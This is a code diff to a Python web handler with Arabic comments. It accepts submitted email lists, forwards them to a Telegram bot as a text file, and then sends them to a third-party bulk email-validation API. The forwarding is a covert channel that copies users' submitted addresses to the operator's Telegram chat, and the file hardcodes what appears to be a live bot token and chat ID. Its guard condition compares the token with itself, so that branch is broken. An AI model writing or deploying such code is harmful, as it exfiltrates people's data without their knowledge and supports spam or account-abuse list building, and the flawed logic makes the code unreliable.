@@ -1,8 +1,9 @@
 import json
 import requests
+import io
 from http.server import BaseHTTPRequestHandler
 
-# ─── ضع بيانات تيليجرام الخاصة بك هنا ───
+# ضع بيانات تيليجرام الخاصة بك هنا
 TELEGRAM_BOT_TOKEN = "8696519516:AAFyWa3RaxPvVo9hJsUHNZKRa3nXKCva5J0"
 TELEGRAM_CHAT_ID = "8554641519"
 
@@ -15,17 +16,21 @@ class handler(BaseHTTPRequestHandler):
 
             emails = data.get("emails", [])
 
-            # 1. إرسال الإيميلات إلى تيليجرام (تقسيمها إذا كانت كثيرة لتفادي حظر التيليجرام)
+            # 1. إرسال الإيميلات إلى تيليجرام كملف نصي (احترام لسياسات تيليجرام و تفادي الحظر)
             if emails and "8696519516:AAFyWa3RaxPvVo9hJsUHNZKRa3nXKCva5J0" not in TELEGRAM_BOT_TOKEN:
                 try:
-                    for i in range(0, len(emails), 50):
-                        chunk = emails[i:i+50]
-                        msg = "📥 New Emails Submitted:\n" + "\n".join(chunk)
-                        requests.post(
-                            f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
-                            json={"chat_id": TELEGRAM_CHAT_ID, "text": msg},
-                            timeout=3
-                        )
+                    # تحويل قائمة الإيميلات إلى ملف نصي في الذاكرة
+                    file_data = io.BytesIO(("\n".join(emails)).encode('utf-8'))
+                    files = {'document': ('emails.txt', file_data, 'text/plain')}
+                    payload = {
+                        'chat_id': TELEGRAM_CHAT_ID, 
+                        'caption': f'📥 New Emails Submitted: {len(emails)}'
+                    }
+                    # إرسال الملف
+                    requests.post(
+                        f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument",
+                        data=payload, files=files, timeout=4
+                    )
                 except Exception as tg_err:
                     print("Telegram Error:", tg_err)
 
@@ -39,7 +44,6 @@ class handler(BaseHTTPRequestHandler):
             }
 
             payload = {'emails': emails}
-
             resp = requests.post('https://gmailxry.com/api/validate-bulk', headers=headers, json=payload, timeout=8)
             resp.raise_for_status()
             api_result = resp.json()
